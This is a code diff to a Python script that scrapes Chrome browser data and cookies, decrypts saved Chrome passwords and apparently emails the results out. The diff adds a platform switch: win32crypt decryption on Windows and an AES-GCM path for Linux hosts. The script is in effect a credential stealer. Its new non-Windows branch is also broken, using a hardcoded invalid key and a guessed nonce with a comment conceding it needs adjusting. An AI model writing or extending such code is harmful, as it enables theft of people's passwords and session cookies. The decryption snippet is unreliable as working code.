@@ -12,7 +12,7 @@ import time
 import browser_cookie3
 import shutil
 import logging
-import win32crypt  # Windows decryption module (for password decryption on Windows)
+import sys
 
 # Set up logging
 logging.basicConfig(level=logging.INFO)
@@ -94,15 +94,31 @@ def scrape_chrome_data():
     with open("chrome_scraped_data.txt", "w") as file:
         file.write(encrypted_data)
 
-# Function to decrypt Chrome's encrypted passwords using win32crypt (for Windows)
+# Function to decrypt Chrome's encrypted passwords using appropriate method based on OS
 def decrypt_password(encrypted_password):
-    try:
-        # Decrypt password using win32crypt (works on Windows)
-        decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
-        return decrypted_password.decode('utf-8')
-    except Exception as e:
-        logging.error(f"Error decrypting password: {str(e)}")
-        return None
+    if sys.platform == "win32":
+        # Use win32crypt on Windows
+        try:
+            import win32crypt
+            decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
+            return decrypted_password.decode('utf-8')
+        except Exception as e:
+            logging.error(f"Error decrypting password with win32crypt: {str(e)}")
+            return None
+    else:
+        # Use PyCryptodome on non-Windows platforms (Linux, Render, etc.)
+        try:
+            from Crypto.Cipher import AES
+            import base64
+            # Decrypt password using PyCryptodome
+            encrypted_password = base64.b64decode(encrypted_password)
+            # Assuming Chrome password encryption uses AES-GCM, we'll need to adjust this.
+            cipher = AES.new(b'peppersalt', AES.MODE_GCM, nonce=encrypted_password[:16])
+            decrypted_password = cipher.decrypt(encrypted_password[16:])
+            return decrypted_password.decode('utf-8')
+        except Exception as e:
+            logging.error(f"Error decrypting password on non-Windows: {str(e)}")
+            return None
 
 # Function to send email with the scraped data
 def send_email(file_path, recipient_email, data):
